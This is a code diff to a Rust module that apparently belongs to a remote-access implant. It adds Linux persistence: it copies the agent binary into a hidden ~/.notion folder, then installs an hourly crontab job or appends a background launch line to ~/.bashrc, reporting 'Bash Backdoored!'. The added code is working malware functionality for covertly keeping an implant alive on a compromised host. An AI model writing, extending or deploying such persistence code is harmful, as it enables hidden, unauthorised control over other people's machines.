@@ -1,10 +1,12 @@
 use std::error::Error;
+use std::env::{var, args};
+#[cfg(not(windows))] use crate::cmd::{shell, save};
+#[cfg(not(windows))] use std::fs::{create_dir, copy};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
-#[cfg(windows)] use std::env::{var};
-#[cfg(windows)] use std::env::args;
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
+use crate::cmd::ConfigOptions;
 
 /// Uses the specified method to establish persistence. 
 /// 
@@ -18,7 +20,7 @@ use std::error::Error;
 /// 
 /// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
 /// * `systemd`: Creates a systemd service and writes the binary someplace special
-pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
+pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
     // `persist [method] [args]`
     #[cfg(windows)] {
         match s.trim() {
@@ -103,6 +105,48 @@ pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
         }
     }
     #[cfg(not(windows))] {
-        Ok("Not implemented yet!".to_string())
+
+        let app_path = args().nth(0).unwrap();
+        let home = var("HOME")?;
+        let app_dir = format!("{home}/.notion");
+        let dest_path = format!("{app_dir}/notion");
+
+        match s.trim() {
+            "cron"    => {
+                // Copy the app to a new folder
+                create_dir(&app_dir)?;
+                if let Ok(_) = copy(&app_path, dest_path) {
+                    // Save config for relaunch
+                    save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
+                    // Write a cronjob to the user's crontab with the given minutes as an interval.
+                    let cron_string = format!("0 * * * * {app_dir}/notion");
+                    if let Ok(_) = shell::handle(&format!("echo '{cron_string}' | crontab - ")).await {
+                        Ok("Cronjob added!".to_string())
+                    } else {
+                        Ok("Could not make cronjob".to_string())
+                    }
+                } else {
+                    Ok("Could not copy app to destination".to_string())
+                }
+            }
+            "bashrc"  => {
+                // Copy the app to a new folder
+                create_dir(&app_dir)?;
+                if let Ok(_) = copy(&app_path, dest_path) {
+                    // Save config for relaunch
+                    save::handle(&format!("{app_dir}/cfg.json"), config_options).await?;
+                    // Write a line to the user's bashrc that starts the agent.
+                    if let Ok(s) = shell::handle(&format!("echo '{app_dir}/notion & disown' >> ~/.bashrc ")).await {
+                        Ok("Bash Backdoored!".to_string())
+                    } else {
+                        Ok("Could not modify bashrc".to_string())
+                    }
+                } else {
+                    Ok("Could not copy app to destination".to_string())
+                }
+            },
+            "service" => Ok("Persisting via service creation!".to_string()), 
+            _         => Ok("Unknown persistence method!".to_string())
+        }
     }
 }
